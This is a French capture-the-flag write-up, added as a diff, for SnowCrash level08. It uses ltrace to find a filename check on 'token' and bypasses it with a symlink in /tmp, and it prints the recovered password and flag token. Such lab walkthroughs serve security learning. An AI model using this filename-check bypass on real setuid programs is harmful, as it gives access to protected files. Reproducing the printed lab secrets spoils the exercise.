@@ -1,0 +1,77 @@
+Level08 :
+
+on se connecte avec le flag07
+
+on se place dans le home : cd 
+
+on inspecte l'ensemble des dossiers et fichiers et leur droits : ls -la
+
+on peut voir un fichier executable : level08 
+et un fichier : token
+
+on test avec les différends fichiers présents
+
+	level08@SnowCrash:~$ ./level08 token
+	You may not access 'token'
+
+	level08@SnowCrash:~$ ./level08 .profile
+	level08: Unable to open .profile: Permission denied
+
+	level08@SnowCrash:~$ ./level08 .bash_logout
+	level08: Unable to open .bash_logout: Permission denied
+
+on utilise ltrace
+
+	level08@SnowCrash:~$ ltrace ./level08 token
+	__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
+	strstr("token", "token")                               = "token"
+	printf("You may not access '%s'\n", "token"You may not access 'token'
+	)           = 27
+	exit(1 <unfinished ...>
+	+++ exited (status 1) +++
+
+	level08@SnowCrash:~$ ltrace ./level08 .bash_logout
+	__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
+	strstr(".bash_logout", "token")                        = NULL
+	open(".bash_logout", 0, 014435162522)                  = 3
+	read(3, "# ~/.bash_logout: executed by ba"..., 1024)   = 220
+	write(1, "# ~/.bash_logout: executed by ba"..., 220# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+	# when leaving the console clear the screen to increase privacy
+
+	if [ "$SHLVL" = 1 ]; then
+	    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+	fi
+	)   = 220
+	+++ exited (status 220) +++
+
+
+on peut voir que si le fichier ne s'appellle pas token il affiche son contenu
+
+	level08@SnowCrash:~$ cat .bash_logout
+	# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+	# when leaving the console clear the screen to increase privacy
+
+	if [ "$SHLVL" = 1 ]; then
+	    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+	fi
+	level08@S
+
+
+
+on cré un lien symbolique entre le token et un fichier (nommé autrement) dans tmp
+	ln -s ~/token /tmp/level08
+
+on relance l'executable avec le fichier dans tmp
+	./level08 /tmp/level08
+
+on obtient le mot de passe du flag
+	quif5eloekouj29ke0vouxean
+
+pn récupère le flag
+	level08@SnowCrash:~$ su flag08
+	Password:
+	Don't forget to launch getflag !
+	flag08@SnowCrash:~$ getflag
+	Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
